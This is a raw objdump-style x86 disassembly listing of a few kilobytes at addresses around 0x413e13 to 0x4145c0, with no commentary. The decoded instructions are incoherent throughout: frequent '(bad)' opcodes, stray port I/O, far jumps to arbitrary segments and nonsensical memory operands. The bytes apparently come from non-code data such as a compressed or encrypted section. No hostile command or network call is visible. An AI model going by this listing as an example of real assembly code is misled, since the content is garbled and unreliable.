  413e13:	sub    dl,BYTE PTR [esi*1-0x430870c6]
  413e1a:	cs cmc 
  413e1c:	xchg   edx,eax
  413e1d:	mov    ds,esp
  413e1f:	or     eax,0x23935fbb
  413e24:	push   0xc
  413e26:	cld    
  413e27:	out    dx,eax
  413e28:	in     al,dx
  413e29:	inc    esp
  413e2a:	sti    
  413e2b:	mov    ds:0x3462205e,al
  413e30:	sahf   
  413e31:	pop    bx
  413e33:	adc    esi,DWORD PTR [edx+0x7f]
  413e36:	daa    
  413e37:	jb     0x413e5e
  413e39:	jne    0x413e65
  413e3b:	mov    ebp,0x5f634629
  413e40:	pop    es
  413e41:	dec    edx
  413e42:	gs push ds
  413e44:	push   cs
  413e45:	push   0xe494021e
  413e4a:	test   eax,0xead34aa1
  413e4f:	loop   0x413e46
  413e51:	xchg   ebp,eax
  413e52:	aad    0xa1
  413e54:	dec    edx
  413e55:	test   al,0xed
  413e57:	aam    0x26
  413e59:	and    ecx,DWORD PTR [edi]
  413e5b:	retf   
  413e5c:	test   al,0x60
  413e5e:	lods   al,BYTE PTR ds:[esi]
  413e5f:	iret   
  413e60:	test   eax,0xb78c94ea
  413e65:	inc    esp
  413e66:	dec    ebx
  413e67:	fnstcw WORD PTR [edi]
  413e69:	or     dl,BYTE PTR gs:[ebp+ecx*4-0x486d2686]
  413e71:	loop   0x413eab
  413e73:	sbb    DWORD PTR [esi+0x3d],ecx
  413e76:	sbb    cl,BYTE PTR [eax]
  413e78:	xchg   ebp,eax
  413e79:	cwde   
  413e7a:	dec    esp
  413e7b:	adc    eax,0xa896cfa3
  413e80:	sar    DWORD PTR [eax-0x68],0xa7
  413e84:	loope  0x413ec9
  413e86:	pop    eax
  413e87:	dec    DWORD PTR [edx+0x6c]
  413e8a:	push   ebp
  413e8b:	popf   
  413e8c:	dec    esi
  413e8d:	gs in  eax,dx
  413e8f:	xchg   edi,eax
  413e90:	cwde   
  413e91:	dec    ecx
  413e92:	adc    al,0xf4
  413e94:	(bad)
  413e97:	push   ecx
  413e98:	test   al,0xc7
  413e9a:	ret    
  413e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e9c:	adc    bh,BYTE PTR [ebx+0x6b2de7e6]
  413ea2:	ret    
  413ea3:	inc    ebx
  413ea4:	in     al,0x6e
  413ea6:	mov    esi,cs
  413ea8:	mov    cl,0xd6
  413eaa:	out    dx,eax
  413eab:	jp     0x413e57
  413ead:	jae    0x413ee7
  413eaf:	js     0x413ec9
  413eb1:	dec    eax
  413eb2:	jmp    0x14996a50
  413eb7:	sub    dh,cl
  413eb9:	clc    
  413eba:	xchg   edx,eax
  413ebb:	and    al,0x4
  413ebe:	cmp    al,ch
  413ec0:	and    edx,ecx
  413ec2:	imul   edx,DWORD PTR [ecx+0x2f],0x52
  413ec6:	pop    ebx
  413ec7:	pop    ebp
  413ec8:	push   ds
  413ec9:	imul   ebx
  413ecb:	les    edi,FWORD PTR [edx-0x74]
  413ece:	out    dx,al
  413ecf:	mov    al,ds:0xe1b42ad1
  413ed4:	adc    al,0x2a
  413ed6:	bound  ebp,QWORD PTR [eax+0x38]
  413ed9:	lods   al,BYTE PTR ds:[esi]
  413eda:	pop    edi
  413edb:	(bad)  [ecx+0x50]
  413ede:	jae    0x413ec1
  413ee0:	stos   DWORD PTR es:[edi],eax
  413ee1:	ja     0x413f0d
  413ee3:	mov    cl,0x17
  413ee5:	neg    DWORD PTR [esi+0x2a]
  413ee8:	cmp    edi,DWORD PTR [esi-0x6959cf0a]
  413eee:	icebp  
  413eef:	jb     0x413f1d
  413ef1:	adc    edx,DWORD PTR [ecx+0x441c7b27]
  413ef7:	ficom  DWORD PTR [ecx-0x5538ead5]
  413efd:	mov    ah,0xdb
  413eff:	in     eax,0xa0
  413f01:	jae    0x413ecd
  413f03:	not    DWORD PTR [ebx]
  413f05:	repnz mov ecx,0x87ca82ea
  413f0b:	std    
  413f0c:	outs   dx,BYTE PTR ds:[esi]
  413f0d:	dec    ebx
  413f0e:	pop    ebp
  413f0f:	push   ebp
  413f10:	mov    WORD PTR [edx+0x4e],?
  413f13:	xchg   ebp,eax
  413f14:	outs   dx,DWORD PTR ds:[esi]
  413f15:	push   ebp
  413f16:	sbb    BYTE PTR [edi-0x283542e5],ah
  413f1c:	sub    DWORD PTR [edi],ebp
  413f1e:	call   DWORD PTR [ebx+0x3f]
  413f21:	aam    0xb
  413f23:	repz push ds
  413f25:	xor    eax,0x5b779710
  413f2a:	out    dx,al
  413f2b:	out    0x18,eax
  413f2d:	mov    ch,0x8f
  413f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f30:	jl     0x413f74
  413f32:	retf   
  413f33:	jmp    0x33b0:0xd8e375e1
  413f3a:	add    edi,DWORD PTR [edi-0x3b5e8a29]
  413f40:	sbb    BYTE PTR ds:0xaa443480,0xa
  413f47:	cmc    
  413f48:	aaa    
  413f49:	lods   eax,DWORD PTR ds:[esi]
  413f4a:	ins    DWORD PTR es:[edi],dx
  413f4b:	in     eax,dx
  413f4c:	mov    edi,0x6d69a6ca
  413f51:	cmp    ebp,eax
  413f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f54:	add    eax,DWORD PTR [ecx-0x4]
  413f57:	and    cl,BYTE PTR [edi+0x2a985c51]
  413f5d:	sub    BYTE PTR [esi-0x52],bh
  413f60:	xchg   esp,eax
  413f61:	leave  
  413f62:	pop    es
  413f63:	test   al,0xc6
  413f65:	(bad)
  413f68:	add    eax,eax
  413f6a:	add    al,0x6d
  413f6c:	nop
  413f6d:	mov    DWORD PTR [esi+0x40f77ee5],ebp
  413f73:	push   ebp
  413f74:	mov    WORD PTR [edx],fs
  413f76:	les    ebp,FWORD PTR gs:[eax-0x21]
  413f7a:	popf   
  413f7b:	out    dx,al
  413f7c:	test   al,0x11
  413f7e:	mov    ebx,0x6f6b0fd7
  413f83:	dec    edx
  413f84:	mov    BYTE PTR [edx-0x1b],0x76
  413f88:	add    eax,0xe93ef7d3
  413f8d:	sbb    al,0x93
  413f8f:	mov    bl,0x95
  413f91:	xchg   BYTE PTR [ebp+0x47],bh
  413f94:	fnstenv [ecx-0x14]
  413f97:	jecxz  0x413fbf
  413f99:	lea    ecx,[edx+0x18]
  413f9c:	xor    edx,ebp
  413f9e:	(bad)  
  413fa0:	jp     0x414000
  413fa2:	jecxz  0x413fc2
  413fa4:	int    0xc1
  413fa6:	(bad)  
  413fa7:	jecxz  0x413f98
  413fa9:	cmc    
  413faa:	std    
  413fab:	jno    0x413f80
  413fad:	inc    ebx
  413fae:	jnp    0x413f68
  413fb0:	loop   0x413fa5
  413fb2:	test   al,0xed
  413fb4:	sub    eax,esi
  413fb6:	stos   BYTE PTR es:[edi],al
  413fb7:	inc    ebx
  413fb8:	push   ecx
  413fb9:	fst    DWORD PTR [edi-0x6f]
  413fbc:	out    dx,eax
  413fbd:	stc    
  413fbe:	jo     0x413fe6
  413fc0:	push   eax
  413fc1:	dec    ecx
  413fc2:	pop    ds
  413fc3:	test   eax,0x61400e07
  413fc8:	div    DWORD PTR [edi+0x11ce7ae4]
  413fce:	out    dx,eax
  413fcf:	stos   DWORD PTR es:[edi],eax
  413fd0:	and    eax,DWORD PTR [edi]
  413fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd3:	data16 in al,0x7b
  413fd6:	and    bl,BYTE PTR [edi+edx*2+0x4a]
  413fda:	mov    cl,0xb7
  413fdc:	add    ebp,DWORD PTR [edi-0x5409517e]
  413fe2:	sbb    DWORD PTR [ebx+0x3cbac120],esp
  413fe8:	aas    
  413fe9:	adc    DWORD PTR [ecx-0x2a],edx
  413fec:	fist   WORD PTR [edx]
  413fee:	jne    0x413fc7
  413ff0:	jle    0x413f9c
  413ff2:	lods   al,BYTE PTR ds:[esi]
  413ff3:	push   ebp
  413ff4:	xchg   edi,eax
  413ff5:	mov    ah,0x6e
  413ff7:	aad    0x85
  413ff9:	out    0x98,al
  413ffb:	jnp    0x414055
  413ffd:	adc    al,BYTE PTR [eax]
  413fff:	lods   al,BYTE PTR ds:[esi]
  414000:	xchg   edx,eax
  414001:	add    eax,DWORD PTR [ecx+0x14]
  414004:	in     eax,0x9d
  414006:	jmp    0x22a9:0xe3dc50a8
  41400d:	mov    eax,0x8d0a36c1
  414012:	jnp    0x414010
  414014:	retf   0xf0ce
  414017:	jae    0x413fbe
  414019:	test   al,0xda
  41401b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41401c:	inc    esi
  41401d:	mov    eax,ds:0xa94fad5e
  414022:	mov    bl,0x7b
  414024:	aad    0x12
  414026:	xor    cl,ch
  414028:	fmul   DWORD PTR [eax]
  41402a:	sub    al,0xb5
  41402c:	dec    ebp
  41402d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41402e:	mov    ah,0xee
  414031:	mov    cl,0x4a
  414033:	pop    esi
  414034:	rcl    DWORD PTR [ecx-0x15fc42a9],1
  41403a:	pop    ecx
  41403b:	das    
  41403c:	adc    esp,DWORD PTR [edx-0x54b555ba]
  414042:	and    BYTE PTR [ecx+0x4f3ec593],ch
  414048:	enter  0xca7b,0x88
  41404c:	inc    esi
  41404d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41404e:	hlt    
  41404f:	fadd   st(3),st
  414051:	or     esi,ebp
  414053:	xchg   esp,eax
  414054:	push   0xffffffc8
  414056:	jne    0x413fe4
  414058:	sbb    bh,BYTE PTR [ebx+0x25]
  41405b:	in     eax,dx
  41405c:	mov    dl,0xde
  41405e:	pop    edx
  41405f:	mov    BYTE PTR [esi-0x546e9641],0x87
  414066:	ins    DWORD PTR es:[edi],dx
  414067:	into   
  414068:	push   esp
  414069:	fcom   DWORD PTR [edi+0x18cfc8a9]
  41406f:	call   0x3a4bfdbc
  414074:	mov    ch,0xcd
  414076:	xchg   DWORD PTR [edx+0x74c702a6],eax
  41407c:	in     al,0x3f
  41407e:	dec    ebx
  41407f:	dec    edi
  414080:	mov    ecx,0x5ce7ed28
  414085:	cmp    DWORD PTR [ebx+0x71],ecx
  414088:	and    BYTE PTR [ebp-0x63],dl
  41408b:	shl    BYTE PTR [esi],1
  41408d:	cmc    
  41408e:	pop    edx
  41408f:	gs jl  0x4140cc
  414092:	das    
  414093:	push   ebp
  414094:	inc    ecx
  414095:	subps  xmm5,xmm6
  414098:	into   
  414099:	pop    eax
  41409a:	cmp    eax,0x8be90d2c
  41409f:	jmp    0x41403b
  4140a1:	iret   
  4140a2:	pmaddwd mm5,QWORD PTR [esi+0x534e4a54]
  4140a9:	aas    
  4140aa:	push   edi
  4140ab:	push   eax
  4140ac:	sbb    BYTE PTR [ecx+ecx*1],bl
  4140af:	push   esi
  4140b0:	mov    al,BYTE PTR [ebp+0x2769a3dc]
  4140b6:	dec    edx
  4140b7:	xchg   esp,eax
  4140b8:	mov    edx,0x1052d763
  4140bd:	jmp    0x79f2:0x5b48d57d
  4140c4:	mov    DWORD PTR [ebp-0x48],edi
  4140c7:	pusha  
  4140c8:	call   0x3e09eb82
  4140cd:	cwde   
  4140ce:	fsubp  st(7),st
  4140d0:	add    ch,dl
  4140d2:	dec    eax
  4140d3:	cmp    ebp,DWORD PTR [ebp+0x6b]
  4140d6:	dec    edi
  4140d7:	test   eax,0x1d584f9f
  4140dc:	in     eax,0x65
  4140de:	scas   eax,DWORD PTR es:[edi]
  4140df:	push   edx
  4140e0:	cmp    al,0xdb
  4140e2:	mov    ah,0xbe
  4140e4:	mov    eax,0x6eacb7f2
  4140e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ea:	ret    0xa20e
  4140ed:	dec    edx
  4140ee:	mov    edi,0xc8dc6415
  4140f3:	jl     0x414151
  4140f5:	mov    esp,0x8f42068e
  4140fa:	stos   BYTE PTR es:[edi],al
  4140fb:	jge    0x414173
  4140fd:	stos   BYTE PTR es:[edi],al
  4140fe:	dec    esi
  4140ff:	lds    ebx,FWORD PTR [ebp-0x57f66376]
  414105:	push   edi
  414106:	in     eax,dx
  414107:	pop    edx
  414108:	cmp    esp,DWORD PTR ds:0xbe909a50
  41410e:	(bad)  
  41410f:	xchg   ecx,eax
  414110:	out    dx,eax
  414111:	inc    ebp
  414112:	jo     0x41412e
  414114:	stos   DWORD PTR es:[edi],eax
  414115:	cli    
  414116:	push   esp
  414117:	(bad)  
  414118:	xor    ah,al
  41411a:	popa   
  41411b:	mov    eax,0xce9521e3
  414120:	or     eax,0xe7a343c7
  414125:	mov    eax,0x9f9b692a
  41412a:	dec    ebp
  41412b:	neg    BYTE PTR [edi-0x15]
  41412e:	mov    ch,0xce
  414130:	add    bl,BYTE PTR [ebx-0x20ddc00e]
  414136:	inc    eax
  414137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414138:	jge    0x414169
  41413a:	fld    DWORD PTR [edi-0x26ed4c36]
  414140:	mov    ah,0xad
  414142:	pop    esi
  414143:	gs inc esi
  414145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414146:	cmp    BYTE PTR [edi+0x19d5b4c4],bh
  41414c:	(bad)  
  41414d:	shl    DWORD PTR [ecx-0x43],cl
  414150:	ffreep st(3)
  414152:	push   ebx
  414153:	iret   
  414154:	xor    esi,DWORD PTR [eax+0x841fbf8]
  41415a:	rcr    BYTE PTR [ebx+0x5292d1c7],0xa7
  414161:	push   ebp
  414162:	icebp  
  414163:	mov    ch,0xe3
  414165:	pop    esi
  414166:	inc    edi
  414167:	shr    edx,cl
  414169:	sbb    edi,edx
  41416b:	push   esi
  41416c:	daa    
  41416d:	push   ds
  41416e:	mov    ebp,0x56b03a0f
  414173:	cmp    al,0x3a
  414175:	jb     0x414121
  414177:	mov    bh,0xc4
  414179:	mov    ch,0x13
  41417b:	xor    DWORD PTR [esi+esi*4-0xd0ab822],esp
  414182:	sub    ah,BYTE PTR [edi+edx*2]
  414185:	inc    edx
  414186:	(bad)  
  414187:	or     eax,0x454f05d
  41418c:	xchg   ebp,eax
  41418d:	ret    
  41418e:	mov    eax,0x1a33e23e
  414193:	dec    eax
  414194:	sub    DWORD PTR [esi],eax
  414196:	aad    0xb1
  414198:	cmp    ch,ah
  41419a:	out    0x7f,al
  41419c:	lea    ecx,[ebp-0x342ac7e3]
  4141a2:	xchg   edi,eax
  4141a3:	ret    0xde13
  4141a6:	(bad)  
  4141a7:	jno    0x41417c
  4141a9:	inc    eax
  4141aa:	mov    ch,0x8f
  4141ac:	xchg   ebp,eax
  4141ad:	fsub   QWORD PTR [edi+0x27bf4732]
  4141b3:	in     eax,0x73
  4141b5:	mov    dh,0xaf
  4141b7:	retf   0x71c5
  4141ba:	rcl    DWORD PTR [ebx-0x4d],1
  4141bd:	sub    eax,0xa1950007
  4141c2:	retf   
  4141c3:	push   ebp
  4141c4:	arpl   dx,di
  4141c6:	xchg   esi,eax
  4141c7:	frstor [ebx+0x7c8ed173]
  4141cd:	fidiv  WORD PTR [ebp-0x72f3a972]
  4141d3:	mov    edx,0x6295b614
  4141d8:	addr16 retw 0x168f
  4141dd:	and    dh,al
  4141df:	ds aaa 
  4141e1:	ror    BYTE PTR [esi-0x51c2ac0b],0xce
  4141e8:	inc    ecx
  4141e9:	test   eax,0xf3dc7f78
  4141ee:	aaa    
  4141ef:	or     edx,edi
  4141f1:	mov    dl,0x3e
  4141f3:	in     eax,dx
  4141f4:	stos   DWORD PTR es:[edi],eax
  4141f5:	xor    bh,al
  4141f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141f8:	pop    ebp
  4141f9:	retf   
  4141fa:	xor    DWORD PTR [ecx+ebx*1],edx
  4141fd:	add    dh,0x92
  414200:	sub    cl,ah
  414202:	xchg   edx,eax
  414203:	aaa    
  414204:	outs   dx,BYTE PTR ds:[esi]
  414205:	lea    ebp,[ecx-0x72b87228]
  41420b:	bound  edi,QWORD PTR [edx]
  41420d:	xchg   BYTE PTR [esi-0x3d],bl
  414210:	add    eax,0xe5b429d5
  414215:	or     DWORD PTR [esi],0xfffffffb
  414218:	mov    gs,WORD PTR [ebp-0x56]
  41421b:	cmp    BYTE PTR [ecx+0x3de15172],0xe4
  414222:	sar    BYTE PTR [edx-0x59],1
  414225:	dec    ebp
  414226:	or     DWORD PTR [eax-0x61],ebx
  414229:	or     dl,BYTE PTR [ebx+0x15]
  41422c:	rol    DWORD PTR [ebx+0xa],cl
  41422f:	xor    eax,0x814cfd78
  414234:	lods   eax,DWORD PTR ds:[esi]
  414235:	sbb    eax,0xfbd2e2b9
  41423a:	imul   edi,DWORD PTR [edi-0xb],0xc765955e
  414241:	cli    
  414242:	int3   
  414243:	mov    cl,0x60
  414245:	pop    esp
  414246:	xchg   ebp,eax
  414247:	mov    WORD PTR [ecx],gs
  414249:	and    dh,bh
  41424b:	int3   
  41424c:	sbb    al,BYTE PTR [edx+0x6da1f485]
  414252:	jge    0x4142c0
  414254:	adc    eax,0x69cfc0fa
  414259:	hlt    
  41425a:	retf   0x6a46
  41425d:	stos   DWORD PTR es:[edi],eax
  41425e:	mov    ebx,0x9e70518a
  414263:	xchg   edx,eax
  414264:	jns    0x4141f4
  414266:	enter  0x5559,0x65
  41426a:	repz call 0x93dff250
  414270:	xor    al,bh
  414272:	push   ebp
  414274:	jb     0x414273
  414276:	mov    ah,0xcc
  414278:	pop    ss
  414279:	jmp    FWORD PTR [ebx-0x22]
  41427c:	mov    eax,ds:0x511b218a
  414281:	mov    ecx,0xa4a49e68
  414286:	out    dx,eax
  414287:	retf   0xb4d4
  41428a:	jg     0x41425a
  41428c:	add    al,0x54
  41428e:	inc    edi
  41428f:	dec    edx
  414290:	push   es
  414291:	lods   eax,DWORD PTR ds:[esi]
  414292:	lods   al,BYTE PTR ds:[esi]
  414293:	dec    esi
  414294:	inc    ebx
  414295:	add    BYTE PTR [ebp-0x2dd4ed39],bl
  41429b:	shl    BYTE PTR [eax],1
  41429d:	and    dl,bh
  41429f:	lods   eax,DWORD PTR ds:[esi]
  4142a0:	outs   dx,BYTE PTR ds:[esi]
  4142a1:	mov    eax,ds:0xb739d71d
  4142a6:	movq   mm5,mm1
  4142a9:	jno    0x4142b8
  4142ab:	jb     0x4142ad
  4142ad:	pop    edx
  4142ae:	jns    0x4142c5
  4142b0:	jns    0x414279
  4142b2:	(bad)  [eax+0x6a523bc]
  4142b8:	sbb    eax,0x94295418
  4142bd:	(bad)  
  4142be:	xlat   BYTE PTR ds:[ebx]
  4142bf:	and    bh,BYTE PTR [esi*8+0x4584a54a]
  4142c6:	imul   edx,eax,0xef4a4e0a
  4142cc:	push   esp
  4142cd:	and    dl,ch
  4142cf:	test   DWORD PTR [esi+esi*1+0x22b512ab],edx
  4142d6:	pop    DWORD PTR [edi]
  4142d8:	cmc    
  4142d9:	fmulp  st(2),st
  4142db:	es pop eax
  4142dd:	test   eax,0x89eec768
  4142e2:	enter  0x560d,0xc7
  4142e6:	in     eax,0xe3
  4142e8:	push   ecx
  4142e9:	jmp    0xf463:0xa7dc2ad8
  4142f0:	pop    eax
  4142f1:	(bad)  
  4142f2:	cmp    eax,0x584a1bad
  4142f7:	mov    ebp,0xd3cc685a
  4142fc:	xor    DWORD PTR [esi+ecx*2],esi
  4142ff:	retf   0x95dd
  414302:	fiadd  DWORD PTR [ecx-0x7d0b3598]
  414308:	mov    dl,0x50
  41430a:	cmp    ch,BYTE PTR [edi-0x15493de0]
  414310:	enter  0x2c3,0x8e
  414314:	lea    esp,[ebp+0x5994f796]
  41431a:	aaa    
  41431b:	repnz clc 
  41431d:	fistp  DWORD PTR [ecx]
  41431f:	add    al,0xc3
  414321:	push   ss
  414322:	or     eax,0xea2f38a7
  414327:	imul   ebx,DWORD PTR [ebx-0x6f],0xc1d69503
  41432e:	loop   0x41433c
  414330:	mov    bl,0xc4
  414332:	data16 jne 0x4143b3
  414335:	xor    eax,0x56bb0fae
  41433a:	jmp    0x41431e
  41433c:	jnp    0x4143ab
  41433e:	xlat   BYTE PTR ds:[ebx]
  41433f:	popf   
  414340:	lods   eax,DWORD PTR ds:[esi]
  414341:	add    dh,BYTE PTR [ebx+0x766d9aca]
  414347:	arpl   sp,dx
  414349:	es mov esp,0x55150f4e
  41434f:	pop    ss
  414350:	xchg   esp,eax
  414351:	cmp    DWORD PTR [eax],edi
  414353:	adc    ecx,esp
  414355:	inc    edx
  414356:	xor    BYTE PTR [eax-0x6a9f2b36],0x42
  41435d:	mov    ecx,0x8d8b8fa2
  414362:	mov    ah,0x11
  414364:	dec    esi
  414366:	cmp    eax,0xd4a60523
  41436b:	(bad)  [edi]
  41436d:	dec    eax
  41436e:	(bad)  [edi-0xc]
  414371:	push   esp
  414372:	(bad)  
  414373:	in     al,dx
  414374:	pop    edx
  414375:	std    
  414376:	xor    al,0x82
  414378:	cmp    al,BYTE PTR [esi+0x6851d9e]
  41437e:	shr    bl,0xeb
  414381:	enter  0xe385,0xf1
  414385:	mov    eax,ds:0xc8dd4087
  41438a:	rcl    ecx,0xef
  41438d:	push   ebx
  41438e:	mov    ss:0xd7c6b0f1,eax
  414394:	adc    esi,DWORD PTR [esi-0x23]
  414397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414398:	enter  0x4b7,0xbb
  41439c:	addr16 repz leave 
  41439f:	data16 fst QWORD PTR [ebp-0x74]
  4143a3:	sub    bl,BYTE PTR [ecx]
  4143a5:	mov    edi,DWORD PTR [edx-0x20]
  4143a8:	nop
  4143a9:	rol    BYTE PTR ds:[eax-0x78567e64],1
  4143b0:	jb     0x4143c8
  4143b2:	ss sbb eax,0x911ef3a3
  4143b8:	xchg   DWORD PTR [esi+0x25],eax
  4143bb:	xchg   BYTE PTR [ecx-0x4a],al
  4143be:	xor    ebp,DWORD PTR ds:0x6b95d073
  4143c4:	xchg   esp,eax
  4143c5:	gs js  0x4143a0
  4143c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c9:	sub    al,0x86
  4143cb:	xlat   BYTE PTR ds:[ebx]
  4143cc:	dec    edi
  4143cd:	mul    BYTE PTR [ebp-0x5b]
  4143d0:	push   es
  4143d1:	inc    ecx
  4143d2:	add    al,dh
  4143d4:	mov    cl,0x2a
  4143d6:	pusha  
  4143d7:	stos   DWORD PTR es:[edi],eax
  4143d8:	mov    bl,0xaa
  4143da:	arpl   WORD PTR [eax],bx
  4143dc:	xor    BYTE PTR es:[ecx+edx*8+0x31],bl
  4143e1:	aaa    
  4143e2:	lods   eax,DWORD PTR ds:[esi]
  4143e3:	push   cs
  4143e4:	popf   
  4143e5:	or     ebp,DWORD PTR [ebp+0x7b07223f]
  4143eb:	mov    esi,0x66e6312f
  4143f0:	mov    edx,gs
  4143f2:	mov    dl,0x3
  4143f4:	fwait
  4143f5:	not    BYTE PTR [ebx-0xb]
  4143f8:	mov    ebx,0x73dfa853
  4143fd:	push   cs
  4143fe:	mov    esp,0x8cf46236
  414403:	mov    ebp,DWORD PTR [edx]
  414405:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414407:	test   BYTE PTR [ecx+0x8],0xe0
  41440b:	pop    DWORD PTR [ebx]
  41440d:	stos   DWORD PTR es:[edi],eax
  41440e:	xchg   DWORD PTR [edi],ebp
  414410:	xor    DWORD PTR [eax],eax
  414412:	in     eax,dx
  414413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414414:	jp     0x41448a
  414416:	add    eax,0xb9d2a02
  41441b:	inc    edx
  41441c:	ror    DWORD PTR [ebx-0x17],1
  41441f:	mov    ah,0x1a
  414421:	lods   eax,DWORD PTR ds:[esi]
  414422:	push   edx
  414423:	push   ecx
  414424:	lods   eax,DWORD PTR ds:[esi]
  414425:	fucomi st,st(7)
  414427:	out    dx,eax
  414428:	pop    edx
  414429:	mov    ebx,0x8c15642a
  41442e:	and    bl,bh
  414430:	mov    ah,0xd5
  414432:	jecxz  0x414492
  414434:	lahf   
  414435:	or     al,cl
  414437:	inc    edx
  414438:	gs es inc eax
  41443b:	sub    BYTE PTR [ebp-0x2285eaa],dh
  414441:	call   DWORD PTR [ebp+0x3e74e35c]
  414447:	or     ch,BYTE PTR [ebp-0x2e]
  41444a:	test   al,0x4a
  41444c:	or     ah,BYTE PTR [ecx+0x75254980]
  414452:	pusha  
  414453:	lods   al,BYTE PTR ds:[esi]
  414454:	cli    
  414455:	dec    DWORD PTR [ecx]
  414457:	sbb    al,0x4
  414459:	cmp    DWORD PTR [edx],0xffffff86
  41445c:	xchg   bl,al
  41445e:	icebp  
  41445f:	stos   BYTE PTR es:[edi],al
  414460:	or     al,0xc8
  414462:	mov    BYTE PTR [eax-0x49],bl
  414465:	mov    dl,0x35
  414467:	add    eax,0xd71f8e2c
  41446c:	sar    BYTE PTR [eax],cl
  41446e:	popf   
  41446f:	gs push esp
  414471:	xor    DWORD PTR [edx],ecx
  414473:	or     bh,BYTE PTR ds:[edx]
  414476:	cld    
  414477:	into   
  414478:	mov    ebp,0x517d2559
  41447d:	xor    BYTE PTR [esi-0x6],0x4d
  414481:	stc    
  414482:	ss or  ebx,edi
  414485:	xlat   BYTE PTR ds:[ebx]
  414486:	shl    BYTE PTR [esi-0x2127f51a],cl
  41448c:	fs mov esi,cs
  41448f:	pop    es
  414490:	out    0x8d,eax
  414492:	mov    edx,0x37ae4555
  414497:	sbb    al,BYTE PTR [esi+0x29]
  41449a:	or     BYTE PTR [ebx],ch
  41449c:	sub    BYTE PTR [ebp-0x1c],al
  41449f:	dec    esp
  4144a0:	mov    ebx,esp
  4144a2:	sub    al,0xb1
  4144a4:	cmp    bh,dh
  4144a6:	(bad)  
  4144a7:	mov    esp,0x25f796ae
  4144ac:	popf   
  4144ad:	(bad)  
  4144ae:	ss push ebp
  4144b0:	daa    
  4144b1:	fsubr  QWORD PTR [esi]
  4144b3:	mov    ch,0xd
  4144b5:	fimul  DWORD PTR [ebx+esi*4-0xea16d75]
  4144bc:	repz and al,BYTE PTR [eax]
  4144bf:	xchg   esp,eax
  4144c0:	push   es
  4144c1:	out    0xf4,eax
  4144c3:	mov    DWORD PTR [edi+0x1b4e271],ebx
  4144c9:	adc    eax,0x44741ab2
  4144ce:	mov    ss,esi
  4144d0:	scas   al,BYTE PTR es:[edi]
  4144d1:	shl    bl,1
  4144d3:	mov    esp,0x22911abc
  4144d8:	mov    ebp,0x1202af23
  4144dd:	adc    eax,0xd1f72db1
  4144e2:	sbb    edx,DWORD PTR [eax-0x5e0794fe]
  4144e8:	push   ds
  4144e9:	int3   
  4144ea:	pop    ecx
  4144eb:	lea    ebx,[edx]
  4144ed:	lods   al,BYTE PTR ds:[esi]
  4144ee:	and    DWORD PTR [eax+0x1702841a],0xffffffeb
  4144f5:	pushf  
  4144f6:	nop
  4144f7:	imul   ebp,DWORD PTR [ecx+0x58],0xffffffec
  4144fb:	ja     0x41451a
  4144fd:	inc    ebx
  4144fe:	inc    ebp
  4144ff:	sub    eax,0xc314bac9
  414504:	push   ecx
  414505:	sahf   
  414506:	jne    0x4144ec
  414508:	inc    eax
  414509:	mov    ebx,eax
  41450b:	cwde   
  41450c:	adc    al,0xbd
  41450e:	mov    fs,WORD PTR [ecx-0x64]
  414511:	lods   eax,DWORD PTR ds:[esi]
  414512:	xchg   ebx,eax
  414513:	sbb    eax,0xd7be8752
  414518:	clc    
  414519:	mov    ah,0xc4
  41451b:	out    0xea,al
  41451d:	enter  0x8b3d,0x2
  414521:	dec    ebx
  414522:	adc    eax,0xc744aaf9
  414527:	out    dx,al
  414528:	and    DWORD PTR [eax+0x3774d28],eax
  41452e:	popa   
  41452f:	sti    
  414530:	add    al,0x2d
  414532:	test   cl,0xd9
  414535:	test   dh,al
  414537:	sar    BYTE PTR [esi],cl
  414539:	pop    ss
  41453a:	jmp    0xa8cd:0xdc31bbe9
  414541:	xchg   BYTE PTR [ecx+eiz*4+0x5a651545],ch
  414548:	sbb    eax,0x8394d785
  41454d:	xchg   DWORD PTR [edi-0x6c],ebx
  414550:	mov    bl,0x16
  414552:	mov    edi,0xd77f3dcf
  414557:	(bad)  
  414559:	mov    cl,0xb8
  41455b:	or     eax,0x59b70b8d
  414560:	inc    edi
  414561:	aaa    
  414562:	inc    esi
  414563:	popf   
  414564:	test   al,0x3b
  414566:	cmp    dh,dh
  414568:	inc    ecx
  414569:	inc    ecx
  41456a:	push   0xe8ce00c0
  41456f:	add    DWORD PTR [eax-0x53e3b33a],eax
  414575:	dec    esi
  414576:	je     0x4145d0
  414578:	pop    es
  414579:	push   ds
  41457a:	lea    ebx,[esi]
  41457c:	jns    0x4145e1
  41457e:	push   ebp
  41457f:	in     al,0xde
  414581:	cmp    edi,0xb6cb134b
  414587:	pop    ecx
  414588:	daa    
  414589:	test   esp,ecx
  41458b:	inc    ecx
  41458c:	push   ebp
  41458d:	xor    DWORD PTR [edx-0x2950a59e],ecx
  414593:	lods   eax,DWORD PTR ds:[esi]
  414594:	mov    ch,bl
  414596:	xchg   esp,eax
  414597:	mov    edx,0x8b524a9
  41459c:	pop    esp
  41459d:	test   edi,esp
  41459f:	icebp  
  4145a0:	mov    bh,0x8e
  4145a2:	retf   
  4145a3:	shl    DWORD PTR gs:[ecx-0x6e],0xe2
  4145a8:	jp     0x414586
  4145aa:	lods   al,BYTE PTR ds:[esi]
  4145ab:	ret    0x8527
  4145ae:	ins    DWORD PTR es:[edi],dx
  4145af:	dec    ecx
  4145b0:	pop    edi
  4145b1:	push   esp
  4145b2:	cmp    DWORD PTR [ecx],edi
  4145b4:	mov    dh,0x8e
  4145b6:	fsub   QWORD PTR [edi-0x7ffc540f]
  4145bc:	(bad)  
  4145bd:	(bad)
  4145c0:	outs   dx,BYTE PTR ds:[esi]
